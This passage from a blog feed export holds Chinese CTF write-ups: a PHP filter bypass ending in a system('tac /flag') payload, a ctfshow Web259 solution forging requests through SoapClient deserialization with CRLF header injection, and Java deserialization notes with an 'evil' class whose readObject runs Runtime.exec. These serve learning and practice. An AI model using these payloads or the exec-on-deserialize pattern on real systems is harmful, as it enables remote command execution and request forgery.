src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029211044492-1700015833096-32-1700989374411-41-1700994492325-17.png" alt="image-20231029211044492"></p><p>之后同理，我们拼接system</p><p>这里我们可以构造字母那其实构造别的符号可以先构造别的函数实现</p><p>这里用这两个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dechex()函数：</span><br><span class="line">可以将十进制转换为十六进制</span><br><span class="line">hex2bin()函数：</span><br><span class="line">可以将十六进制转换为ascii码</span><br></pre></td></tr></table></figure><p>那么单引号就是</p><p>?c&#x3D;base_convert(37907361743,10,36)(27)</p><p>这里想办法构造一个参数传入点，类似$_GET[1]这样</p><p>这里_ 和 []过滤了 因此要用前面小数点的方法构造</p><p>为了省长度 一次性把_GET都构造出来</p><p>[被过滤了 可以用{代替 就不用构造了 同样$没过滤 直接用就行</p><p>base_convert(37907361743,10,36)(dechex(1598506324))<img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029211738989-1700015833096-29-1700989374410-40-1700994492325-16.png" alt="image-20231029211738989"></p><p>下面想办法传入$_GET(1)</p><p>?c&#x3D;$kkk&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$kkk){1}</p><p>思路是先传入一个变量kkk，再用$$kkk等价于与$_GET </p><p> 这里发现之前不是什么字母都能用的，把kkk换成白名单了随便一个</p><p>c&#x3D;$cos&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}</p><p>先试试phpinfo()</p><p>这里利用变量执行函数，利用了php7的特性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">($a)($b)   //这里a是一个字符串，内容是一个函数名//b也是字符串，内容是参数$a=&#x27;print_r&#x27;$b=&#x27;test&#x27;//对于无参数函数</span><br><span class="line">$a=&#x27;phpinfo&#x27;$a()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//无法输出</span><br><span class="line">&lt;?php</span><br><span class="line">  $a=&#x27;phpinfo()&#x27;;</span><br><span class="line">  ($a)</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//正常输出</span><br><span class="line">&lt;?php</span><br><span class="line">  $a=&#x27;phpinfo&#x27;;</span><br><span class="line">  ($a)()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>所以我们为了后面能执行，要传入两个变量 一个是函数名 一个是参数</p><p>?c&#x3D;$cos&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}(($$cos){2})</p><p>测试</p><p>最终payload:?c&#x3D;$cos&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}(($$cos){2})&amp;1&#x3D;system&amp;2&#x3D;tac%20&#x2F;flag</p><p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029212838216-1700015833096-31-1700989374411-42-1700994492325-15.png" alt="image-20231029212838216"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/09/24/Web259/"/>
      <url>/2023/09/24/Web259/</url>
      
        <content type="html"><![CDATA[<h1 id="Web259"><a href="#Web259" class="headerlink" title="Web259"></a>Web259</h1><p>先贴一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目界面就一个简单的get传参，接收到的值反序列化传到getflag()函数</p><p>其他啥也没给，想到就是要用到原生类</p><p>后面题目界面给的源码，里面要求ip&#x3D;127.0.0.1，他又开启了xff，想改包发包来着，他又进行了两次pop，还要token的值&#x3D;&#x3D;ctfshow，结合这些，基本上可以确定用SoapClient原生类</p><p>这里先介绍一下里面的函数</p><blockquote><p><strong>explode()</strong> 函数可以把字符串打散为数组。</p><p>array_pop()函数：去除数组最后一个元素，返回数组的最后一个值。如果数组是空的，或者非数组，将返回 NULL。</p><p> file_put_contents函数：把$flag写入flag.txt</p><p>explode()函数：把字符串打散为数组</p><p>介绍完函数，分析一下去获取flag的过程。 题目中 array_pop()函数 使用了两次，最后将ip赋给$ip，</p><p>这里说一下这个 array_pop()函数两次的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1#返回：空</span><br><span class="line">127.0.0.1,127.0.0.2#返回：127.0.0.1</span><br><span class="line">127.0.0.1,127.0.0.2,127.0.0.3#返回：127.0.0.2</span><br></pre></td></tr></table></figure></blockquote><p>这里尝试去伪造 X-Forwarded-For，发现不行，因为使用了Cloudflare，至于如何去判断一个网站是否使用了Cloudflare</p><p>至于怎么判断一个网站是否试用了Cloudflare代理</p><p>接下来我们看一下SoapClient原生类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class SoapClient &#123;</span><br><span class="line">    /* Methods */</span><br><span class="line">    public __construct(?string $wsdl, array $options = [])</span><br><span class="line">    public __call(string $name, array $args): mixed</span><br><span class="line">    public __doRequest(</span><br><span class="line">        string $request,</span><br><span class="line">        string $location,</span><br><span class="line">        string $action,</span><br><span class="line">        int $version,</span><br><span class="line">        bool $oneWay = false</span><br><span class="line">    ): ?string</span><br><span class="line">    public __getCookies(): array</span><br><span class="line">    public __getFunctions(): ?array</span><br><span class="line">    public __getLastRequest(): ?string</span><br><span class="line">    public __getLastRequestHeaders(): ?string</span><br><span class="line">    public __getLastResponse(): ?string</span><br><span class="line">    public __getLastResponseHeaders(): ?string</span><br><span class="line">    public __getTypes(): ?array</span><br><span class="line">    public __setCookie(string $name, ?string $value = null): void</span><br><span class="line">    public __setLocation(?string $location = null): ?string</span><br><span class="line">    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool</span><br><span class="line">    public __soapCall(</span><br><span class="line">        string $name,</span><br><span class="line">        array $args,</span><br><span class="line">        ?array $options = null,</span><br><span class="line">        SoapHeader|array|null $inputHeaders = null,</span><br><span class="line">        array &amp;$outputHeaders = null</span><br><span class="line">    ): mixed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<strong>SoapClient</strong>原生类中包含<code>__call</code>方法，并且我们知道：当调用一个对象中不存在的方法时候，会执行<code>call()</code>魔术方法。</p><p>因此在CTF中通常会出现一种<strong>存在调用不存在的方法</strong>、<strong>并且需要我们伪造请求头</strong>的题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$vip = unserialize($_GET[&#x27;vip&#x27;]);</span><br><span class="line">//vip can get flag one key</span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>看源码可以看到他会对传入的vip进行反序列化，并且调用getflag方法，显然此处没有定义getflag方法，因此考虑到跟call魔术方法有关，原生类soap里有这个函数，加上请求头的要求</p><p>我们本地测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9998/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9999/test&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924123610341.png" alt="image-20230924123610341"></p><p>仔细观察后，发现是一个POST请求，并且SOAPAction的值是可控的</p><p>但是仅仅依靠这一处，没有办法伪造整一个POST请求，因为Content-Type是xml形式的，并且后面的传输内容也都是xml形式的，一般情况下POST传递参数的格式都是表单形式的（application&#x2F;x-www-form-urlencoded)</p><p>因此我们可以想办法伪造User-Agent头：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;qingchuan&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9998/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9999/test&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924123849790.png" alt="image-20230924123849790"></p><p>可以看到我们的USER-AGENT也该进去了，当<strong>User-Agent</strong>成为了我们的可控参数后，<strong>User-Agent</strong>下方的<strong>Content-Type</strong>也同样可以被伪造，利用<code>\r\n</code>换行即可伪造</p><p>再次修改后的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ua=&quot;qingchuan\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">$client = new SoapClient(null,array(&#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1:9998/&#x27; , &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1:9999/test&#x27;,&#x27;user_agent&#x27; =&gt; $ua));</span><br><span class="line"></span><br><span class="line">$client-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>现在我们已经伪造好了请求包</p><p>代码中有几个注意的点</p><ul><li>因为$ua中用到了<code>\r\n</code>这两个换行符，因此要用双引号包裹<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">crlf</a></li><li>HTTP请求头之间的参数用一组<code>\r\n</code>分割即可</li><li>HTTP请求头与POSTDATA之间要用两个<code>\r\n</code>分割.</li><li>设置<strong>User-Agent</strong>时，应写成<strong>user_agent</strong></li></ul><p>监听一下在</p><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924125424078.png" alt="image-20230924125424078"></p><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924125512870.png" alt="image-20230924125512870"></p><p>红圈里的是有效请求，</p><p>因为我们设置了<strong>Content-Length</strong>的值为<strong>13</strong>，超出13个字符以外的都会被服务器丢弃，所以影响不大。</p><p>在本地测试完成了，接下来我们将相关参数修改与题目相对应。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ua = &quot;qingchuan\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">$client = new SoapClient(null,array(&#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27; , &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27; , &#x27;user_agent&#x27; =&gt; $ua));</span><br><span class="line"></span><br><span class="line">print_r(urlencode(serialize($client)));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A133%3A%22qingchuan%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>传入后访问flag.txt即可</p><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924125929067.png" alt="image-20230924125929067"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Java序列化和反序列化学习"><a href="#Java序列化和反序列化学习" class="headerlink" title="Java序列化和反序列化学习"></a>Java序列化和反序列化学习</h1><p>写在前面：谨记java反序列化学习，或许是简单的的吧</p><p>##前置知识：</p><p>user类和**<code>Serialize_test_1 </code>**的关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="comment">//定义类的私有属性name</span></span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="comment">//定义setName方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="comment">//当前类User的name等于setName传递进来的name</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义getName方法，返回name值</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize_test_1</span> &#123;</span><br><span class="line"><span class="comment">//序列化，返回值为字节类型，输入值为对象Object</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//创建字节数组输出流实例 btout,将所有发送到输出流的数据保存在该字节数组缓冲区中, 个人理解就是读数据并放入缓存区，读的数据以字节类型的数组保存在缓冲区</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="comment">//创建objOut 对象输出流实例,也是类似以上的读数据，不过操作的是对象流，不是字节流，序列化对项的类，使其变得可以传输，操作</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line"><span class="comment">//调用对象输出为流的对象方法</span></span><br><span class="line">objOut.writeObject(obj);</span><br><span class="line"><span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//反序列化,返回值类型为对象类型，输入为字节类型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line"><span class="keyword">return</span> objIn.readObject();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//实例化对象user，并设置其私有变量name值为posty</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">user.setName(<span class="string">&quot;posty&quot;</span>);</span><br><span class="line"><span class="comment">//序列化对象</span></span><br><span class="line"><span class="type">byte</span>[] serializeData = serialize(user);</span><br><span class="line"><span class="comment">//文件流，创建文件user.bin并写序列化后的数据</span></span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;user.bin&quot;</span>);</span><br><span class="line">fout.write(serializeData);</span><br><span class="line">fout.close();</span><br><span class="line"><span class="comment">// (User)表示把反序列化后的对象转为User对象，并赋值给已经声明为User类的变量user2</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> (User) unserialize(serializeData);</span><br><span class="line"><span class="comment">//调用User的getName方法</span></span><br><span class="line">System.out.print(user2.getName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####Java 方法重写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> qingchuan.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line">    <span class="comment">//原测试为public不成功, 改为private</span></span><br><span class="line">    <span class="comment">//重写readObject()反序列化方法</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="comment">//默认反序列化，反序列化非静态非瞬态字段</span></span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        <span class="comment">//调用exec方法执行命令cmd</span></span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> qingchuan.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj )<span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//序列化，返回值为字节类型，输入值为对象Object</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream objOut=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建objout 对象输出流实例，也是类似以上的读数据，不过操作的是对象流，不是字节流，协力恶化对象的类，使其编的可以传输，操作</span></span><br><span class="line">        objOut.writeObject(obj);<span class="comment">//调用输出对象为流的对象方法</span></span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;<span class="comment">//反序列化，返回值类型为对象类型，输入为字节类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialize)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        ObjectInputStream objIn=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//恶意cmd测试</span></span><br><span class="line">        <span class="type">evil</span> <span class="variable">evil</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">evil</span>();</span><br><span class="line">        evil.cmd = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="comment">//序列化对象evil并传递蚕食出门的=“calc。exe”；</span></span><br><span class="line">        <span class="type">byte</span>[] serializeData=serialize(evil);</span><br><span class="line">        <span class="comment">//通过自定义的readObject反序列化</span></span><br><span class="line">        <span class="comment">//传递参数cmd,执行了恶意的redaObject（）方法</span></span><br><span class="line">        unserialize(serializeData);</span><br><span class="line">        System.out.println(evil.cmd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####Java 继承与向上转型</p><pre><code>   